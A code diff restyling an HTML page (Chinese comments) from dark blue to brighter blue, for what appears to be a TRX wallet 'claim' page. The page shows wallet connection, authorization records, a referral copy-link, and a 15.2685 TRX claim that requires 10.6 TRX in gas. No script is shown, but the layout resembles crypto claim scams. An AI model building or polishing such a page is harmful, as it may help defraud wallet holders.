@@ -7,7 +7,7 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        /* 暗色系偏蓝主风格 + 紧凑布局 */
+        /* 暗色系+亮蓝色主风格 */
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             padding: 15px 12px; 
@@ -20,28 +20,27 @@
             flex-direction: column;
             gap: 13px; 
         }
-        /* 主体容器：紧凑布局 */
         .container {
             flex: 1;
             display: flex;
             flex-direction: column;
             gap: 10px; 
         }
-        /* 头部：精简间距 */
+        /* 头部：亮蓝色标题/图标 */
         .header {
             text-align: center;
             padding: 10px 0;
-            border-bottom: 1px solid #253b5c; /* 蓝系边框 */
+            border-bottom: 1px solid #334155; /* 调亮边框：原#253b5c → #334155 */
             margin-bottom: 5px;
         }
         .header .logo {
             font-size: 24px; 
-            color: #3b82f6; /* 蓝系图标 */
+            color: #3b82f6; /* 亮蓝色图标：保留（本身较亮） */
             margin-bottom: 6px;
         }
         .header h1 { 
             font-size: 22px; 
-            color: #3b82f6; /* 蓝系标题 */
+            color: #3b82f6; /* 亮蓝色标题 */
             margin-bottom: 5px;
         }
         .header .desc {
@@ -51,89 +50,74 @@
             margin: 0 auto;
             line-height: 1.4; 
         }
-        /* 警告框：精简内边距 */
+        /* 警告框：亮蓝色背景+文字 */
         .warning {
-            background: #253b5c; /* 蓝系背景 */
-            color: #81b4f4; /* 蓝系文字 */
+            background: #334155; /* 调亮背景：原#253b5c → #334155 */
+            color: #93c5fd; /* 调亮文字：原#81b4f4 → #93c5fd */
             padding: 12px; 
             border-radius: 8px;
             font-size: 13px; 
-            border-left: 3px solid #3b82f6; /* 蓝系左边框 */
+            border-left: 3px solid #3b82f6; /* 亮蓝色边框 */
             line-height: 1.5;
         }
         .warning strong {
-            color: #3b82f6; /* 蓝系强调文字 */
+            color: #3b82f6; /* 亮蓝色强调文字 */
         }
-        /* 用户信息卡：精简内边距 */
+        /* 用户信息卡：亮蓝色边框 */
         #userInfo {
             text-align: center;
             font-size: 14px;
             padding: 15px; 
             background: #1e2925;
             border-radius: 8px;
-            border: 1px solid #253b5c; /* 蓝系边框 */
+            border: 1px solid #334155; /* 调亮边框：原#253b5c → #334155 */
             line-height: 1.6;
         }
         #userInfo span {
-            color: #3b82f6; /* 蓝系高亮 */
+            color: #3b82f6; /* 亮蓝色高亮 */
             font-weight: 500;
         }
-        /* 新增：钱包状态容器（紧跟用户信息卡） */
+        /* 钱包状态容器：亮蓝色调 */
         #walletStatusContainer {
             background: #1e2925;
             padding: 15px;
             border-radius: 8px;
-            border: 1px solid #253b5c; /* 蓝系边框 */
+            border: 1px solid #334155; /* 调亮边框：原#253b5c → #334155 */
             font-size: 13px;
             color: #a0a8a4;
             line-height: 1.6;
         }
         #walletStatusContainer .status-title {
             font-size: 15px;
-            color: #3b82f6; /* 蓝系标题 */
+            color: #3b82f6; /* 亮蓝色标题 */
             margin-bottom: 8px;
             display: flex;
             align-items: center;
             gap: 6px;
         }
         #walletStatusContainer .connected-content {
-            display: none; /* 初始隐藏已连接内容 */
+            display: none;
         }
         #walletStatusContainer.connected .disconnected-content {
-            display: none; /* 连接后隐藏未连接内容 */
+            display: none;
         }
         #walletStatusContainer.connected .connected-content {
-            display: block; /* 连接后显示已连接内容 */
+            display: block;
         }
         #walletStatusContainer .highlight {
-            color: #3b82f6; /* 蓝系高亮 */
+            color: #3b82f6; /* 亮蓝色高亮 */
             font-weight: 500;
         }
-        /* 授权记录区：紧凑布局 */
+        /* 授权记录区：亮蓝色边框/标题 */
         .record-list {
             background: #1e2925;
             padding: 15px; 
             border-radius: 8px;
-            border: 1px solid #253b5c; /* 蓝系边框 */
-        }
-        .record-list h3 {
-            font-size: 16px;
-            color: #3b82f6; /* 蓝系标题 */
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .record-item {
-            background: #121a17;
-            padding: 12px; 
-            margin-bottom: 10px;
-            border-radius: 6px;
-            border: 1px solid #253b5c; /* 蓝系边框 */
-            font-size: 13px;
+            border: 1px solid #334155; /* 调亮边框：原#253b5c → #334155 */
+        font-size: 13px;
         }
         .record-item:hover {
-            border-color: #3b82f6; /* 蓝系hover边框 */
+            border-color: #3b82f6; /* 亮蓝色hover边框 */
             transition: border-color 0.3s;
         }
         .record-item p {
@@ -146,7 +130,7 @@
             margin-right: 5px;
         }
         .tx-link {
-            color: #3b82f6; /* 蓝系链接 */
+            color: #3b82f6; /* 亮蓝色链接 */
             text-decoration: none;
             display: inline-flex;
             align-items: center;
@@ -156,7 +140,7 @@
         .tx-link:hover {
             text-decoration: underline;
         }
-        /* 复制链接区：紧凑布局 */
+        /* 复制链接区：亮蓝色边框/按钮 */
         .copy-link-wrap {
             background: #1e2925;
             padding: 8px; 
@@ -164,7 +148,7 @@
             display: flex;
             align-items: center;
             gap: 8px;
-            border: 1px solid #253b5c; /* 蓝系边框 */
+            border: 1px solid #334155; /* 调亮边框：原#253b5c → #334155 */
         }
         #copyLinkText {
             flex: 1;
@@ -175,7 +159,7 @@
         }
         #copyLinkBtn {
             padding: 6px 12px; 
-            background: #1e40af; /* 蓝系按钮 */
+            background: #2563eb; /* 调亮按钮：原#1e40af → #2563eb */
             color: #fff;
             border: none;
             border-radius: 6px;
@@ -186,16 +170,16 @@
             font-size: 13px;
         }
         #copyLinkBtn:hover {
-            background: #1e50b3; /* 蓝系按钮hover */
+            background: #3b82f6; /* 调亮hover：原#1e50b3 → #3b82f6 */
         }
-        /* 底部按钮组：紧凑 + 按条件隐藏 */
+        /* 底部按钮组：亮蓝色按钮 */
         .btn-group {
             display: flex;
             flex-direction: column;
             gap: 5px; 
             margin-top: 10px;
             padding: 10px 0;
-            border-top: 1px solid #253b5c; /* 蓝系边框 */
+            border-top: 1px solid #334155; /* 调亮边框：原#253b5c → #334155 */
         }
         .btn {
             width: 100%;
@@ -203,7 +187,7 @@
             font-size: 15px;
             border: none;
             border-radius: 8px;
-            background: #1e40af; /* 蓝系按钮 */
+            background: #2563eb; /* 调亮按钮：原#1e40af → #2563eb */
             color: white;
             cursor: pointer;
             display: flex;
@@ -213,18 +197,18 @@
             transition: background 0.3s;
         }
         .btn:hover {
-            background: #1e50b3; /* 蓝系按钮hover */
+            background: #3b82f6; /* 调亮hover：原#1e50b3 → #3b82f6 */
         }
         .btn:disabled {
-            background: #1a365d; /* 蓝系按钮禁用 */
+            background: #294b75; /* 调亮禁用：原#1a365d → #294b75 */
             color: #a0a8a4;
             cursor: not-allowed;
         }
-        /* 底部信息区：精简 */
+        /* 底部信息区：亮蓝色调 */
         .footer-info {
             margin-top: 10px;
             padding-top: 10px;
-            border-top: 1px solid #253b5c; /* 蓝系边框 */
+            border-top: 1px solid #334155; /* 调亮边框：原#253b5c → #334155 */
             font-size: 11px; 
             color: #a0a8a4;
             text-align: center;
@@ -232,10 +216,10 @@
         }
         .footer-info .safety-tip {
             margin-bottom: 6px;
-            color: #81b4f4; /* 蓝系提示 */
+            color: #93c5fd; /* 调亮提示：原#81b4f4 → #93c5fd */
         }
         .footer-info a {
-            color: #3b82f6; /* 蓝系链接 */
+            color: #3b82f6; /* 亮蓝色链接 */
             text-decoration: none;
         }
         .footer-info a:hover {
@@ -244,6 +228,7 @@
         .text-right {
             text-align: right;
         }
+
     </style>
 </head>
 <body>
@@ -274,7 +259,7 @@
             <div class="connected-content">
                 <p>✅ 钱包已成功连接</p>
                 <p>• 钱包地址：<span class="highlight" id="statusAddress"></span></p>
-                <p>• 领取类型：</p><strong>TRX</strong>
+                <p>• 领取类型：<strong>TRX</strong></p>
                 <p>• 领取额度：<strong>15.2685</strong></p>
                 <p>• 需消耗Gas费：<strong>10.6TRX</strong></p>
                 <p>提示：请确保足够的TRX余额，先择放弃直接退出即可二次登入不会改变领取的类型和额度</p>
